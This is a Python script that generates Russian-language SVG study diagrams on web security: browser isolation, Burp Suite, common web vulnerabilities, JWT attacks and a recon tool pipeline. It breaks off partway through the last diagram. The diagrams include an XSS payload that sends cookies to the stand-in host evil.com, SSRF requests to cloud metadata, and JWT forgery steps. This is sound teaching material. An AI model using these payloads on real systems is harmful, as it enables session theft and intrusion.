# -*- coding: utf-8 -*-
import os

assets_dir = r"c:\Users\giogo\OneDrive\Desktop\Security\05-Assets"
os.makedirs(assets_dir, exist_ok=True)

# 1. Browser Security: DOM, SOP, CORS, CSP, Storage
svg_browser = """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 760" width="100%" height="100%" style="background-color: #0d1117; font-family: 'Segoe UI', Roboto, Arial, sans-serif;">
  <rect x="30" y="25" width="1140" height="75" rx="14" fill="#161b22" stroke="#30363d" stroke-width="1.5"/>
  <text x="55" y="60" font-size="24" font-weight="bold" fill="#58a6ff">🛡️ АРХИТЕКТУРА И ЗАЩИТА БРАУЗЕРА (DOM • SOP • CORS • CSP • STORAGE)</text>
  <text x="55" y="84" font-size="14" fill="#8b949e">Как браузер изолирует вкладки друг от друга, где хранит токены и как защищает от кражи данных</text>

  <!-- 3 Pillars Row -->
  <!-- SOP -->
  <g transform="translate(30, 120)">
    <rect width="365" height="290" rx="14" fill="#161b22" stroke="#1f6feb" stroke-width="2"/>
    <rect x="20" y="18" width="325" height="34" rx="8" fill="#1f6feb"/>
    <text x="32" y="40" font-size="15" font-weight="bold" fill="#ffffff">1. SOP (Same-Origin Policy)</text>
    <text x="20" y="75" font-size="14" font-weight="bold" fill="#79c0ff">«Глухая стена между вкладками»</text>
    <text x="20" y="100" font-size="12.5" fill="#c9d1d9">Вкладка evil.com НЕ МОЖЕТ прочитать</text>
    <text x="20" y="120" font-size="12.5" fill="#c9d1d9">ответы и данные вкладки mybank.com.</text>
    <rect x="20" y="138" width="325" height="90" rx="8" fill="#0d1117" stroke="#30363d"/>
    <text x="32" y="160" font-size="12" font-weight="bold" fill="#7ee787">Origin = Протокол + Домен + Порт</text>
    <text x="32" y="182" font-family="monospace" font-size="12" fill="#d2a8ff">https:// + bank.com + :443</text>
    <text x="32" y="206" font-size="11.5" fill="#f85149">Если хоть 1 часть отличается ➔ ЧУЖАК!</text>
    <text x="20" y="255" font-size="12" fill="#8b949e">✔ Защищает от чтения чужих данных</text>
    <text x="20" y="275" font-size="12" fill="#8b949e">⚠️ Но не мешает отправить запрос (CSRF!)</text>
  </g>

  <!-- CORS -->
  <g transform="translate(417, 120)">
    <rect width="365" height="290" rx="14" fill="#161b22" stroke="#d29922" stroke-width="2"/>
    <rect x="20" y="18" width="325" height="34" rx="8" fill="#d29922"/>
    <text x="32" y="40" font-size="15" font-weight="bold" fill="#000000">2. CORS (Cross-Origin Sharing)</text>
    <text x="20" y="75" font-size="14" font-weight="bold" fill="#e3b341">«Официальная дверь по пропуску»</text>
    <text x="20" y="100" font-size="12.5" fill="#c9d1d9">Разрешает фронтенду app.site.com</text>
    <text x="20" y="120" font-size="12.5" fill="#c9d1d9">законно брать данные у api.site.com.</text>
    <rect x="20" y="138" width="325" height="90" rx="8" fill="#0d1117" stroke="#30363d"/>
    <text x="32" y="160" font-family="monospace" font-size="11.5" fill="#7ee787">Access-Control-Allow-Origin:</text>
    <text x="32" y="180" font-family="monospace" font-size="11.5" fill="#79c0ff">  https://app.site.com</text>
    <text x="32" y="202" font-family="monospace" font-size="11.5" fill="#f0883e">Access-Control-Allow-Credentials: true</text>
    <text x="20" y="255" font-size="12" fill="#f85149">🔥 Опасность: Allow-Origin: * или отражение</text>
    <text x="20" y="275" font-size="12" fill="#f85149">любого Origin вместе с Credentials: true!</text>
  </g>

  <!-- CSP -->
  <g transform="translate(805, 120)">
    <rect width="365" height="290" rx="14" fill="#161b22" stroke="#2ea043" stroke-width="2"/>
    <rect x="20" y="18" width="325" height="34" rx="8" fill="#2ea043"/>
    <text x="32" y="40" font-size="15" font-weight="bold" fill="#ffffff">3. CSP (Content Security Policy)</text>
    <text x="20" y="75" font-size="14" font-weight="bold" fill="#7ee787">«Фейсконтроль против XSS»</text>
    <text x="20" y="100" font-size="12.5" fill="#c9d1d9">Приказ от сервера браузеру: откуда</text>
    <text x="20" y="120" font-size="12.5" fill="#c9d1d9">разрешено загружать и запускать JS-код.</text>
    <rect x="20" y="138" width="325" height="90" rx="8" fill="#0d1117" stroke="#30363d"/>
    <text x="32" y="160" font-family="monospace" font-size="11.5" fill="#7ee787">Content-Security-Policy:</text>
    <text x="32" y="180" font-family="monospace" font-size="11.5" fill="#c9d1d9">  default-src 'self';</text>
    <text x="32" y="200" font-family="monospace" font-size="11.5" fill="#d2a8ff">  script-src 'self' https://cdn.com</text>
    <text x="20" y="255" font-size="12" fill="#7ee787">✔ Блокирует внедрённые &lt;script&gt; (XSS)</text>
    <text x="20" y="275" font-size="12" fill="#f85149">⚠️ Дыра: unsafe-inline / unsafe-eval</text>
  </g>

  <!-- Bottom Row: DOM & Browser Storage -->
  <g transform="translate(30, 435)">
    <rect width="550" height="295" rx="14" fill="#161b22" stroke="#8957e5" stroke-width="2"/>
    <rect x="20" y="18" width="510" height="34" rx="8" fill="#8957e5"/>
    <text x="32" y="40" font-size="15" font-weight="bold" fill="#ffffff">🌳 DOM (Document Object Model) — Живое дерево страницы</text>
    <text x="20" y="75" font-size="13" fill="#c9d1d9">Браузер превращает HTML-текст в живое дерево объектов, которым</text>
    <text x="20" y="95" font-size="13" fill="#c9d1d9">управляет JavaScript (меняет кнопки, текст, читает поля ввода).</text>
    <rect x="20" y="112" width="510" height="160" rx="8" fill="#0d1117" stroke="#30363d"/>
    <text x="35" y="138" font-family="monospace" font-size="12.5" fill="#79c0ff">window.document</text>
    <text x="55" y="162" font-family="monospace" font-size="12.5" fill="#c9d1d9">├── &lt;html&gt; ➔ &lt;body&gt; ➔ &lt;div id="chat"&gt;</text>
    <text x="55" y="186" font-family="monospace" font-size="12.5" fill="#f0883e">├── Источники (Sources): location.search, location.hash</text>
    <text x="55" y="210" font-family="monospace" font-size="12.5" fill="#f85149">└── Опасные стоки (Sinks): element.innerHTML, eval()</text>
    <text x="35" y="248" font-size="12" font-weight="bold" fill="#f85149">🎯 DOM XSS: когда данные из URL попадают прямо в innerHTML!</text>
  </g>

  <g transform="translate(605, 435)">
    <rect width="565" height="295" rx="14" fill="#161b22" stroke="#da3633" stroke-width="2"/>
    <rect x="20" y="18" width="525" height="34" rx="8" fill="#da3633"/>
    <text x="32" y="40" font-size="15" font-weight="bold" fill="#ffffff">🗄️ ХРАНИЛИЩА БРАУЗЕРА: Cookies vs LocalStorage vs SessionStorage</text>
    
    <rect x="20" y="68" width="525" height="65" rx="8" fill="#0d1117" stroke="#30363d"/>
    <text x="32" y="90" font-size="13" font-weight="bold" fill="#7ee787">1. Cookies (Куки) — до 4 КБ</text>
    <text x="32" y="108" font-size="12" fill="#c9d1d9">Улетают на сервер АВТОМАТИЧЕСКИ с каждым запросом.</text>
    <text x="32" y="124" font-size="11.5" fill="#58a6ff">Флаги защиты: HttpOnly (нельзя украсть через JS!), Secure, SameSite</text>

    <rect x="20" y="143" width="525" height="65" rx="8" fill="#0d1117" stroke="#30363d"/>
    <text x="32" y="165" font-size="13" font-weight="bold" fill="#e3b341">2. LocalStorage — до 5–10 МБ (Вечное хранилище)</text>
    <text x="32" y="183" font-size="12" fill="#c9d1d9">Хранится вечно даже после перезагрузки ПК. Управляется только из JS.</text>
    <text x="32" y="199" font-size="11.5" fill="#f85149">⚠️ Опасность: при любом XSS хакер крадёт токен: localStorage.getItem('jwt')</text>

    <rect x="20" y="218" width="525" height="60" rx="8" fill="#0d1117" stroke="#30363d"/>
    <text x="32" y="240" font-size="13" font-weight="bold" fill="#d2a8ff">3. SessionStorage — до 5 МБ (На одну вкладку)</text>
    <text x="32" y="260" font-size="12" fill="#c9d1d9">Живёт только пока открыта текущая вкладка. Закрыл вкладку — всё стёрлось.</text>
  </g>
</svg>"""

# 2. Burp Suite Architecture
svg_burp = """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 620" width="100%" height="100%" style="background-color: #0d1117; font-family: 'Segoe UI', Roboto, Arial, sans-serif;">
  <rect x="30" y="25" width="1140" height="75" rx="14" fill="#161b22" stroke="#30363d" stroke-width="1.5"/>
  <text x="55" y="60" font-size="24" font-weight="bold" fill="#f0883e">🕵️ КАК РАБОТАЕТ BURP SUITE (СХЕМА ПЕРЕХВАТА И МОДУЛЕЙ)</text>
  <text x="55" y="84" font-size="14" fill="#8b949e">Браузер ➔ Прокси-перехватчик (127.0.0.1:8080) ➔ Repeater / Intruder ➔ Целевой Сервер</text>

  <!-- Browser -->
  <g transform="translate(30, 130)">
    <rect width="230" height="200" rx="14" fill="#161b22" stroke="#58a6ff" stroke-width="2"/>
    <text x="35" y="45" font-size="18" font-weight="bold" fill="#58a6ff">🌐 Твой Браузер</text>
    <text x="25" y="80" font-size="13" fill="#c9d1d9">Ты нажимаешь кнопку</text>
    <text x="25" y="102" font-size="13" fill="#c9d1d9">«Купить» или «Войти».</text>
    <rect x="20" y="125" width="190" height="55" rx="8" fill="#0d1117" stroke="#30363d"/>
    <text x="30" y="148" font-family="monospace" font-size="12" fill="#7ee787">Proxy: 127.0.0.1</text>
    <text x="30" y="168" font-family="monospace" font-size="12" fill="#7ee787">Port:  8080</text>
  </g>

  <!-- Arrow Browser to Proxy -->
  <path d="M 260 230 L 330 230" stroke="#58a6ff" stroke-width="3"/>
  <polygon points="330,224 342,230 330,236" fill="#58a6ff"/>

  <!-- Burp Proxy Center -->
  <g transform="translate(345, 120)">
    <rect width="510" height="465" rx="16" fill="#161b22" stroke="#f0883e" stroke-width="2.5"/>
    <rect x="20" y="18" width="470" height="36" rx="8" fill="#f0883e"/>
    <text x="35" y="42" font-size="16" font-weight="bold" fill="#0d1117">⏸️ ЯДРО BURP SUITE (Локальный Прокси)</text>

    <!-- Proxy Intercept -->
    <rect x="20" y="70" width="470" height="115" rx="10" fill="#0d1117" stroke="#d29922"/>
    <text x="35" y="95" font-size="15" font-weight="bold" fill="#e3b341">1. Proxy ➔ Intercept &amp; HTTP History</text>
    <text x="35" y="118" font-size="12.5" fill="#c9d1d9">Запрос замирает на паузе! Ты видишь сырой пакет и решаешь:</text>
    <text x="35" y="142" font-family="monospace" font-size="12" fill="#7ee787">[Forward] — отпустить   [Drop] — удалить</text>
    <text x="35" y="166" font-size="12" fill="#8b949e">В HTTP History сохраняется полная лента всех фоновых запросов.</text>

    <!-- Repeater -->
    <rect x="20" y="200" width="470" height="115" rx="10" fill="#0d1117" stroke="#8957e5"/>
    <text x="35" y="225" font-size="15" font-weight="bold" fill="#d2a8ff">2. Repeater (Горячая клавиша: Ctrl + R)</text>
    <text x="35" y="248" font-size="12.5" fill="#c9d1d9">Ручная лаборатория исследователя (90% времени работы!):</text>
    <text x="35" y="270" font-size="12" fill="#c9d1d9">• Меняешь ID, цену, заголовки, JSON-поля или промпт.</text>
    <text x="35" y="292" font-size="12" fill="#7ee787">• Жмёшь Send хоть 100 раз и сравниваешь ответы сервера.</text>

    <!-- Intruder -->
    <rect x="20" y="330" width="470" height="115" rx="10" fill="#0d1117" stroke="#da3633"/>
    <text x="35" y="355" font-size="15" font-weight="bold" fill="#f85149">3. Intruder (Горячая клавиша: Ctrl + I)</text>
    <text x="35" y="378" font-size="12.5" fill="#c9d1d9">Автоматический пулемёт (Fuzzing &amp; Brute-force):</text>
    <text x="35" y="400" font-size="12" fill="#c9d1d9">• Выделяешь параметр значками §id=105§ и загружаешь словарь.</text>
    <text x="35" y="422" font-size="12" fill="#e3b341">• Ищешь ответы, где отличается Status Code (200) или Длина (Length)!</text>
  </g>

  <!-- Arrow Proxy to Server -->
  <path d="M 855 230 L 925 230" stroke="#f0883e" stroke-width="3"/>
  <polygon points="925,224 937,230 925,236" fill="#f0883e"/>

  <!-- Target Server -->
  <g transform="translate(940, 130)">
    <rect width="230" height="200" rx="14" fill="#161b22" stroke="#2ea043" stroke-width="2"/>
    <text x="30" y="45" font-size="18" font-weight="bold" fill="#7ee787">🖥️ Сервер (API)</text>
    <text x="25" y="80" font-size="13" fill="#c9d1d9">Думает, что общается</text>
    <text x="25" y="102" font-size="13" fill="#c9d1d9">с обычным браузером!</text>
    <rect x="20" y="125" width="190" height="55" rx="8" fill="#0d1117" stroke="#30363d"/>
    <text x="30" y="148" font-family="monospace" font-size="12" fill="#79c0ff">Ответ: 200 / 403 / 500</text>
    <text x="30" y="168" font-family="monospace" font-size="12" fill="#d2a8ff">+ Сырой JSON</text>
  </g>
</svg>"""

# 3. PortSwigger Vulnerabilities & JS Sinks Map
svg_vulns = """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 720" width="100%" height="100%" style="background-color: #0d1117; font-family: 'Segoe UI', Roboto, Arial, sans-serif;">
  <rect x="30" y="25" width="1140" height="75" rx="14" fill="#161b22" stroke="#30363d" stroke-width="1.5"/>
  <text x="55" y="60" font-size="24" font-weight="bold" fill="#f85149">💥 КАРТА ГЛАВНЫХ ВЕБ-УЯЗВИМОСТЕЙ (PORTSWIGGER LABS &amp; JS SINKS)</text>
  <text x="55" y="84" font-size="14" fill="#8b949e">XSS • CSRF • SSRF • IDOR • Auth Bypass • Опасные функции JavaScript (Sources &amp; Sinks)</text>

  <!-- Row 1: XSS, CSRF, SSRF -->
  <g transform="translate(30, 120)">
    <rect width="365" height="265" rx="14" fill="#161b22" stroke="#f85149" stroke-width="2"/>
    <rect x="20" y="18" width="325" height="32" rx="6" fill="#da3633"/>
    <text x="32" y="39" font-size="15" font-weight="bold" fill="#ffffff">1. XSS (Cross-Site Scripting)</text>
    <text x="20" y="72" font-size="13" font-weight="bold" fill="#f0883e">Суть: Запуск твоего JS в браузере жертвы</text>
    <text x="20" y="96" font-size="12" fill="#c9d1d9">• Reflected: скрипт отражается из URL-параметра</text>
    <text x="20" y="116" font-size="12" fill="#c9d1d9">• Stored: скрипт сохранён в БД (в комментарии)</text>
    <text x="20" y="136" font-size="12" fill="#c9d1d9">• DOM-based: ошибка внутри клиентского JS</text>
    <rect x="20" y="152" width="325" height="55" rx="6" fill="#0d1117" stroke="#30363d"/>
    <text x="30" y="175" font-family="monospace" font-size="11.5" fill="#7ee787">&lt;img src=x onerror=fetch('https://</text>
    <text x="30" y="195" font-family="monospace" font-size="11.5" fill="#7ee787">evil.com/?c='+document.cookie)&gt;</text>
    <text x="20" y="235" font-size="12" fill="#79c0ff">🛡️ Защита: Экранирование HTML + CSP + HttpOnly</text>
  </g>

  <g transform="translate(417, 120)">
    <rect width="365" height="265" rx="14" fill="#161b22" stroke="#d29922" stroke-width="2"/>
    <rect x="20" y="18" width="325" height="32" rx="6" fill="#d29922"/>
    <text x="32" y="39" font-size="15" font-weight="bold" fill="#000000">2. CSRF (Подделка запроса)</text>
    <text x="20" y="72" font-size="13" font-weight="bold" fill="#e3b341">Суть: Действие от имени жертвы без её ведома</text>
    <text x="20" y="96" font-size="12" fill="#c9d1d9">Жертва заходит на сайт хакера, а он в фоне</text>
    <text x="20" y="116" font-size="12" fill="#c9d1d9">шлёт запрос в банк: «Сменить почту / перевод».</text>
    <text x="20" y="136" font-size="12" fill="#c9d1d9">Браузер САМ прикрепляет куки жертвы!</text>
    <rect x="20" y="152" width="325" height="55" rx="6" fill="#0d1117" stroke="#30363d"/>
    <text x="30" y="175" font-family="monospace" font-size="11.5" fill="#f0883e">&lt;form action="https://bank.com/email"</text>
    <text x="30" y="195" font-family="monospace" font-size="11.5" fill="#f0883e">method="POST"&gt;...auto-submit!&lt;/form&gt;</text>
    <text x="20" y="235" font-size="12" fill="#79c0ff">🛡️ Защита: CSRF-токен + SameSite=Strict/Lax</text>
  </g>

  <g transform="translate(805, 120)">
    <rect width="365" height="265" rx="14" fill="#161b22" stroke="#8957e5" stroke-width="2"/>
    <rect x="20" y="18" width="325" height="32" rx="6" fill="#8957e5"/>
    <text x="32" y="39" font-size="15" font-weight="bold" fill="#ffffff">3. SSRF (Запрос от имени сервера)</text>
    <text x="20" y="72" font-size="13" font-weight="bold" fill="#d2a8ff">Суть: Заставить сервер просканировать сеть</text>
    <text x="20" y="96" font-size="12" fill="#c9d1d9">Сервер просят загрузить картинку по URL,</text>
    <text x="20" y="116" font-size="12" fill="#c9d1d9">а хакер подсовывает внутренний адрес:</text>
    <text x="20" y="136" font-size="12" fill="#c9d1d9">локальную админку или ключи облака AWS!</text>
    <rect x="20" y="152" width="325" height="55" rx="6" fill="#0d1117" stroke="#30363d"/>
    <text x="30" y="175" font-family="monospace" font-size="11.5" fill="#7ee787">url=http://127.0.0.1:8080/admin</text>
    <text x="30" y="195" font-family="monospace" font-size="11.5" fill="#7ee787">url=http://169.254.169.254/latest/meta-data</text>
    <text x="20" y="235" font-size="12" fill="#79c0ff">🛡️ Защита: Белый список доменов, запрет локальных IP</text>
  </g>

  <!-- Row 2: IDOR & Auth Bypass + JS Sources/Sinks -->
  <g transform="translate(30, 410)">
    <rect width="550" height="280" rx="14" fill="#161b22" stroke="#2ea043" stroke-width="2"/>
    <rect x="20" y="18" width="510" height="32" rx="6" fill="#2ea043"/>
    <text x="32" y="39" font-size="15" font-weight="bold" fill="#ffffff">4. IDOR, Бизнес-логика и Auth Bypass (Любимчики Bug Bounty)</text>
    <text x="20" y="74" font-size="13" font-weight="bold" fill="#7ee787">• IDOR (Insecure Direct Object Reference):</text>
    <text x="32" y="96" font-size="12.5" fill="#c9d1d9">Меняем /api/invoice?id=105 на id=104 ➔ читаем чужой чек или переписку!</text>
    <text x="20" y="128" font-size="13" font-weight="bold" fill="#7ee787">• Нарушение бизнес-логики (Business Logic Flaws):</text>
    <text x="32" y="150" font-size="12.5" fill="#c9d1d9">Отрицательное количество товара (-5 шт.), пропуск шага оплаты, гонка (Race Condition).</text>
    <text x="20" y="182" font-size="13" font-weight="bold" fill="#7ee787">• Auth Bypass (Обход аутентификации):</text>
    <text x="32" y="204" font-size="12.5" fill="#c9d1d9">Подмена заголовков (X-Forwarded-For: 127.0.0.1), смена метода POST на GET,</text>
    <text x="32" y="224" font-size="12.5" fill="#c9d1d9">обход 2FA через прямой переход на /dashboard.</text>
    <text x="20" y="258" font-size="12" font-weight="bold" fill="#f0883e">🎯 Не требуют сложных эксплойтов — только внимания и понимания логики!</text>
  </g>

  <g transform="translate(605, 410)">
    <rect width="565" height="280" rx="14" fill="#161b22" stroke="#1f6feb" stroke-width="2"/>
    <rect x="20" y="18" width="525" height="32" rx="6" fill="#1f6feb"/>
    <text x="32" y="39" font-size="15" font-weight="bold" fill="#ffffff">5. АНАЛИЗ JAVASCRIPT: ИСТОЧНИКИ (SOURCES) ➔ СТОКИ (SINKS)</text>
    <text x="20" y="72" font-size="12.5" fill="#c9d1d9">При анализе чужого JS-кода (в DevTools / Burp) ищем путь от ввода к опасной функции:</text>
    
    <rect x="20" y="90" width="245" height="165" rx="8" fill="#0d1117" stroke="#e3b341"/>
    <text x="32" y="114" font-size="13" font-weight="bold" fill="#e3b341">📥 SOURCES (Откуда берёт ввод)</text>
    <text x="32" y="138" font-family="monospace" font-size="12" fill="#c9d1d9">• location.search (?q=...)</text>
    <text x="32" y="160" font-family="monospace" font-size="12" fill="#c9d1d9">• location.hash (#...)</text>
    <text x="32" y="182" font-family="monospace" font-size="12" fill="#c9d1d9">• document.referrer</text>
    <text x="32" y="204" font-family="monospace" font-size="12" fill="#c9d1d9">• window.name</text>
    <text x="32" y="226" font-family="monospace" font-size="12" fill="#c9d1d9">• postMessage событиe</text>

    <text x="275" y="175" font-size="22" fill="#f85149">➔</text>

    <rect x="305" y="90" width="240" height="165" rx="8" fill="#0d1117" stroke="#f85149"/>
    <text x="317" y="114" font-size="13" font-weight="bold" fill="#f85149">💥 SINKS (Опасные функции)</text>
    <text x="317" y="138" font-family="monospace" font-size="12" fill="#f0883e">• element.innerHTML = ...</text>
    <text x="317" y="160" font-family="monospace" font-size="12" fill="#f0883e">• document.write(...)</text>
    <text x="317" y="182" font-family="monospace" font-size="12" fill="#f0883e">• eval(...) / setTimeout()</text>
    <text x="317" y="204" font-family="monospace" font-size="12" fill="#f0883e">• location.href = ... (javascript:)</text>
    <text x="317" y="226" font-family="monospace" font-size="12" fill="#7ee787">✔ Безопасно: textContent</text>
  </g>
</svg>"""

# 4. JWT Structure & Attacks
svg_jwt = """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 620" width="100%" height="100%" style="background-color: #0d1117; font-family: 'Segoe UI', Roboto, Arial, sans-serif;">
  <rect x="30" y="25" width="1140" height="75" rx="14" fill="#161b22" stroke="#30363d" stroke-width="1.5"/>
  <text x="55" y="60" font-size="24" font-weight="bold" fill="#d2a8ff">🪪 АНАТОМИЯ JWT-ТОКЕНА И АТАКИ НА СЕССИИ</text>
  <text x="55" y="84" font-size="14" fill="#8b949e">Три части JWT (Header.Payload.Signature), почему он НЕ зашифрован и как его ломают</text>

  <!-- Token String Banner -->
  <rect x="30" y="118" width="1140" height="55" rx="10" fill="#161b22" stroke="#30363d"/>
  <text x="50" y="152" font-family="monospace" font-size="17" font-weight="bold">
    <tspan fill="#ff7b72">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</tspan><tspan fill="#ffffff">.</tspan><tspan fill="#d2a8ff">eyJ1c2VyX2lkIjo0Miwicm9sZSI6InVzZXIifQ</tspan><tspan fill="#ffffff">.</tspan><tspan fill="#58a6ff">SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</tspan>
  </text>

  <!-- 3 Parts -->
  <g transform="translate(30, 190)">
    <rect width="365" height="190" rx="12" fill="#161b22" stroke="#ff7b72" stroke-width="2"/>
    <text x="20" y="32" font-size="16" font-weight="bold" fill="#ff7b72">1. HEADER (Красная часть)</text>
    <text x="20" y="55" font-size="12.5" fill="#8b949e">Алгоритм подписи и тип токена (Base64):</text>
    <rect x="20" y="68" width="325" height="75" rx="8" fill="#0d1117"/>
    <text x="35" y="92" font-family="monospace" font-size="13" fill="#ff7b72">{ "alg": "HS256",</text>
    <text x="35" y="118" font-family="monospace" font-size="13" fill="#ff7b72">  "typ": "JWT" }</text>
    <text x="20" y="168" font-size="12" fill="#c9d1d9">Говорит серверу, как проверять печать</text>
  </g>

  <g transform="translate(417, 190)">
    <rect width="365" height="190" rx="12" fill="#161b22" stroke="#d2a8ff" stroke-width="2"/>
    <text x="20" y="32" font-size="16" font-weight="bold" fill="#d2a8ff">2. PAYLOAD (Фиолетовая часть)</text>
    <text x="20" y="55" font-size="12.5" fill="#8b949e">Данные пользователя (НЕ зашифрованы!):</text>
    <rect x="20" y="68" width="325" height="75" rx="8" fill="#0d1117"/>
    <text x="35" y="92" font-family="monospace" font-size="13" fill="#d2a8ff">{ "user_id": 42, "role": "user",</text>
    <text x="35" y="118" font-family="monospace" font-size="13" fill="#d2a8ff">  "exp": 1794250000 }</text>
    <text x="20" y="168" font-size="12" fill="#f85149">⚠️ Любой может прочитать через Base64!</text>
  </g>

  <g transform="translate(805, 190)">
    <rect width="365" height="190" rx="12" fill="#161b22" stroke="#58a6ff" stroke-width="2"/>
    <text x="20" y="32" font-size="16" font-weight="bold" fill="#58a6ff">3. SIGNATURE (Синяя часть)</text>
    <text x="20" y="55" font-size="12.5" fill="#8b949e">Криптографическая печать сервера:</text>
    <rect x="20" y="68" width="325" height="75" rx="8" fill="#0d1117"/>
    <text x="30" y="92" font-family="monospace" font-size="12" fill="#58a6ff">HMACSHA256(</text>
    <text x="30" y="112" font-family="monospace" font-size="12" fill="#c9d1d9">  header + "." + payload,</text>
    <text x="30" y="132" font-family="monospace" font-size="12" fill="#7ee787">  SECRET_KEY_ON_SERVER )</text>
    <text x="20" y="168" font-size="12" fill="#7ee787">✔ Защищает токен от изменения руками</text>
  </g>

  <!-- Attacks Row -->
  <g transform="translate(30, 405)">
    <rect width="1140" height="185" rx="14" fill="#161b22" stroke="#f85149" stroke-width="2"/>
    <text x="25" y="35" font-size="17" font-weight="bold" fill="#f85149">🔥 4 ГЛАВНЫЕ АТАКИ НА JWT И СЕССИИ:</text>

    <rect x="25" y="52" width="260" height="115" rx="8" fill="#0d1117" stroke="#30363d"/>
    <text x="38" y="75" font-size="13.5" font-weight="bold" fill="#f0883e">1. Забытая проверка подписи</text>
    <text x="38" y="98" font-size="12" fill="#c9d1d9">Сервер использует jwt.decode()</text>
    <text x="38" y="116" font-size="12" fill="#c9d1d9">вместо jwt.verify() — меняем</text>
    <text x="38" y="134" font-size="12" fill="#7ee787">role: admin и сразу входим!</text>

    <rect x="302" y="52" width="260" height="115" rx="8" fill="#0d1117" stroke="#30363d"/>
    <text x="315" y="75" font-size="13.5" font-weight="bold" fill="#f0883e">2. Атака Alg: None</text>
    <text x="315" y="98" font-size="12" fill="#c9d1d9">Меняем в Header "alg": "none",</text>
    <text x="315" y="116" font-size="12" fill="#c9d1d9">стираем подпись после второй</text>
    <text x="315" y="134" font-size="12" fill="#7ee787">точки (header.payload.)!</text>

    <rect x="579" y="52" width="260" height="115" rx="8" fill="#0d1117" stroke="#30363d"/>
    <text x="592" y="75" font-size="13.5" font-weight="bold" fill="#f0883e">3. Брутфорс слабого Secret</text>
    <text x="592" y="98" font-size="12" fill="#c9d1d9">Если ключ простой (secret123),</text>
    <text x="592" y="116" font-size="12" fill="#c9d1d9">подбираем его через hashcat</text>
    <text x="592" y="134" font-size="12" fill="#7ee787">и сами штампуем любые JWT!</text>

    <rect x="856" y="52" width="260" height="115" rx="8" fill="#0d1117" stroke="#30363d"/>
    <text x="869" y="75" font-size="13.5" font-weight="bold" fill="#f0883e">4. Session Hijacking</text>
    <text x="869" y="98" font-size="12" fill="#c9d1d9">Кража готового токена или</text>
    <text x="869" y="116" font-size="12" fill="#c9d1d9">сессионной куки через XSS,</text>
    <text x="869" y="134" font-size="12" fill="#7ee787">MITM или логи в URL.</text>
  </g>
</svg>"""

# 5. Recon & Automation Pipeline + Vulnerable Labs
svg_recon = """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 620" width="100%" height="100%" style="background-color: #0d1117; font-family: 'Segoe UI', Roboto, Arial, sans-serif;">
  <rect x="30" y="25" width="1140" height="75" rx="14" fill="#161b22" stroke="#30363d" stroke-width="1.5"/>
  <text x="55" y="60" font-size="24" font-weight="bold" fill="#7ee787">⚡ КОНВЕЙЕР АВТОМАТИЗАЦИИ (RECON FLOW) И ЛОКАЛЬНЫЕ ПОЛИГОНЫ</text>
  <text x="55" y="84" font-size="14" fill="#8b949e">Как охотники за багами автоматизируют поиск скрытых папок, старых ссылок и уязвимостей</text>

  <!-- Pipeline Row -->
  <g transform="translate(30, 125)">
    <rect width="1140" height="230" rx="14" fill="#161b22" stroke="#2ea043" stroke-width="2"/>
    <text x="25" y="35" font-size="17" font-weight="bold" fill="#7ee787">🚀 БОЕВОЙ ПАЙПЛАЙН РАЗВЕДКИ (RECON FLOW В ОДНУ ЦЕПОЧКУ):</text>

    <!-- Tool 1 -->
    <rect x="25" y="55" width="255" height="150" rx="10" fill="#0d1117" stroke="#58a6ff"/>
    <text x="40" y="82" font-size="15" font-weight="bold" fill="#58a6ff">1. gau &amp; waybackurls</text>
    <text x="40" y="105" font-size="12" fill="#8b949e">Машина времени веба:</text>
    <text x="40" y="125" font-size="12" fill="#c9d1d9">Достают тысячи старых и</text>
    <text x="40" y="143" font-size="12" fill="#c9d1d9">забытых ссылок сайта из</text>
    <text x="40" y="161" font-size="12" fill="#c9d1d9">архивов интернета.</text>
    <text x="40" y="188" font-family="monospace" font-size="11.5" fill="#7ee787">gau target.com &gt; urls.txt</text>

    <text x="292" y="135" font-size="22" fill="#7ee787">➔</text>

    <!-- Tool 2 -->
    <rect x="320" y="55" width="255" height="150" rx="10" fill="#0d1117" stroke="#e3b341"/>
    <text x="335" y="82" font-size="15" font-weight="bold" fill="#e3b341">2. ffuf (Fuzzing)</text>
    <text x="335" y="105" font-size="12" fill="#8b949e">Скоростной поиск скрытых дверей:</text>
    <text x="335" y="125" font-size="12" fill="#c9d1d9">Перебирает тысячи слов в</text>
    <text x="335" y="143" font-size="12" fill="#c9d1d9">секунду вместо слова FUZZ</text>
    <text x="335" y="161" font-size="12" fill="#c9d1d9">(/admin, /.env, /backup.zip).</text>
    <text x="335" y="188" font-family="monospace" font-size="11.5" fill="#7ee787">ffuf -u site.com/FUZZ -w list</text>

    <text x="587" y="135" font-size="22" fill="#7ee787">➔</text>

    <!-- Tool 3 -->
    <rect x="615" y="55" width="255" height="150" rx="10" fill="#0d1117" stroke="#d2a8ff"/>
    <text x="630" y="82" font-size="15" font-weight="bold" fill="#d2a8ff">3. nuclei (Сканер)</text>
    <text x="630" y="105" font-size="12" fill="#8b949e">Авто-проверка по шаблонам:</text>
    <text x="630" y="125" font-size="12" fill="#c9d1d9">Проверяет найденные адреса</text>
    <text x="630" y="143" font-size="12" fill="#c9d1d9">по базе тысяч готовых CVE,</text>
    <text x="630" y="161" font-size="12" fill="#c9d1d9">утечек ключей и багов.</text>
    <text x="630" y="188" font-family="monospace" font-size="11.5" fill="#7ee787">nuclei -l urls.txt -t cves/</text>

    <text x="882" y="135" font-size="22" fill="#7ee787">➔</text>

    <!-- Tool 4 -->
    <rect x="910" y="55" width="205" height="150" rx="10" fill="#0d1117" stroke="#f85149"/>
    <text x="925" y="82" font-size="15" font-weight="bold" fill="#f85149">4. Burp Suite</text>
    <text x="925" y="105" font-size="12" fill="#8b949e">Ручное добивание:</text>
    <text x="925" y="125" font-size="12" fill="#c9d1d9">Самые интересные</text>
    <text x="925" y="143" font-size="12" fill="#c9d1d9">находки открываем</text>
    <text x="925" y="161" font-size="12" fill="#c9d1d9">в Repeater и ломаем</text>
    <text x="925" y="179" font-size="12" fill="#c9d1d9">логику руками!</text>
  </g>

  <!-- Bottom Row: Vulnerable Labs -->
  <g transform="translate(30, 380)">
    <rect width="1140" height="210" rx="14" fill="#161b22" stroke="#1f6feb" stroke-width="2"/>
